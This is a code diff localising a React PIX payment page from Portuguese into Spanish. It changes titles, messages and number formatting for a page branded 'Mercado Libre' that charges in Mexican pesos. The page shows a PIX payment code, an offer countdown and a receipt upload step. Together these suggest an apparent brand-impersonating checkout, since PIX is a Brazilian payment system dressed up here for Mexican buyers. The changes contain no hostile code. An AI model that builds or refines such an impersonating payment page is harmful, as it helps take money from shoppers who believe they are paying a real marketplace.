@@ -9,8 +9,8 @@ import { OfferTimerBanner } from "@/components/OfferTimerBanner";
 export const Route = createFileRoute("/pagamento")({
   head: () => ({
     meta: [
-      { title: "Pagamento PIX - Mercado Livre" },
-      { name: "description", content: "Finalize seu pagamento via PIX." },
+      { title: "Pago PIX - Mercado Libre" },
+      { name: "description", content: "Finalice su pago vía PIX." },
     ],
   }),
   component: PagamentoPage,
@@ -27,7 +27,7 @@ type PixPayment = {
 };
 
 function formatMXN(v: number): string {
-  return "$ " + v.toLocaleString("es-MX", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  return v.toLocaleString("es-MX", { style: "currency", currency: "MXN", minimumFractionDigits: 2, maximumFractionDigits: 2 });
 }
 
 function PagamentoPage() {
@@ -47,7 +47,7 @@ function PagamentoPage() {
 
   useEffect(() => {
     try {
-      const raw = sessionStorage.getItem("pixPayment") || localStorage.getItem("pixPayment");
+      const raw = sessionStorage.getItem("pixPayment");
       if (!raw) { window.location.href = "/checkout"; return; }
       const parsed = JSON.parse(raw);
       setPay(parsed);
@@ -136,9 +136,9 @@ function PagamentoPage() {
       trackEvent("pix_copied", { transactionId: String(pay.transactionId) });
       setTimeout(() => setCopied(false), 3000);
     } catch (err) {
-      console.error("Erro ao copiar PIX:", err);
+      console.error("Error al copiar PIX:", err);
       // Fallback final via prompt para garantir que o usuário consiga o código
-      window.prompt("Pressione Ctrl+C ou mantenha pressionado para copiar o código PIX:", pay.qrcode);
+      window.prompt("Presione Ctrl+C o mantenga presionado para copiar el código PIX:", pay.qrcode);
     }
   };
 
@@ -236,13 +236,13 @@ function PagamentoPage() {
         </button>
 
         <div className="pg-value">Monto a pagar: <span style={{ display: "inline-flex", alignItems: "flex-start" }}>
-          {formatMXN(pay?.amount || 0).split(',')[0]}
-          <span style={{ fontSize: "0.5em", marginTop: 4, marginLeft: 1 }}>{formatMXN(pay?.amount || 0).split(',')[1] || '00'}</span>
+          {formatMXN(pay?.amount || 0).split('.')[0]}
+          <span style={{ fontSize: "0.5em", marginTop: 4, marginLeft: 1 }}>.{formatMXN(pay?.amount || 0).split('.')[1] || '00'}</span>
         </span></div>
 
         {showUpload && (
           <div className="pg-proof">
-            <div className="pg-proof-t">¿Pagó su pedido e aún não ha sido confirmado??</div>
+            <div className="pg-proof-t">¿Pagó su pedido e aún no ha sido confirmado?</div>
             <div className="pg-proof-sub">Adjunte el comprobante ahora para agilizar su entrega.</div>
             {(() => {
               const disabled = uploadState === "uploading" || uploadState === "done" || !pay;
@@ -276,10 +276,10 @@ function PagamentoPage() {
                           contentType: file.type || "application/octet-stream",
                           dataBase64: b64,
                         }});
-                        setUploadState("done"); setUploadMsg("¡Comprobante recibido!! Estamos validando.");
+                        setUploadState("done"); setUploadMsg("¡Comprobante recibido! Estamos validando.");
                         trackEvent("receipt_uploaded", { transactionId: String(pay.transactionId) });
                       } catch (err: any) {
-                        setUploadState("error"); setUploadMsg(err?.message || "Falha no envio");
+                        setUploadState("error"); setUploadMsg(err?.message || "Error en el envío");
                         trackEvent("receipt_upload_error", { message: String(err?.message ?? err) });
                       }
                     }}
